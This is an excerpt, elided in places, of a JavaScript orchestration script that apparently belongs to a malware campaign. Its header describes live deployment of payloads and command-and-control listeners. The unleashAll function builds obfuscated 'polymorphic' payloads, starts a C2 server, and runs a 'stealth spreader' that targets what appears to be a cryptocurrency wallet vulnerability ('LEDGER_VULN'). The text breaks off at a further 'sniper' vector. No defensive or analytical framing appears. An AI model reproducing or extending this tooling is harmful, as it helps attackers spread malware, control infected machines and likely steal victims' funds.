 ...
 * VERSION: LIVE_UNLEASH_V1 | Auth: INCHRISTOURREDEEMER!09
 * 
 * This terminal orchestrates the live execution of all campaign vectors.
 * It manages builds, deploys payloads, and initiates C2 listeners.
 */
...
async function unleashAll() {
    ...
    // 1. Build & Obfuscate Payloads (Metamorphic Phase)
    const buildSuccess = await runCommand('node scripts/builder.js', 'Polymorphic Build Pipeline');
    if (!buildSuccess) return;

    // 2. Start Apex C2 Terminal (Listening Phase)
    console.log("[MASTER] Starting Apex C2 Server...");
    const c2 = exec('node server/apex_c2.js', { cwd: __dirname + '/../' });
    c2.stdout.on('data', (data) => console.log(`[C2] ${data}`));
    
    // 3. Trigger Active Spreaders (Propagation Phase)
    // C4 & C9: Direct Social Vector
    await runCommand('node scripts/stealth_spreader.js --target=LEDGER_VULN', 'C9 Ledger Vector Deployment');
    
    // C8: Jupiter Sniper Authority
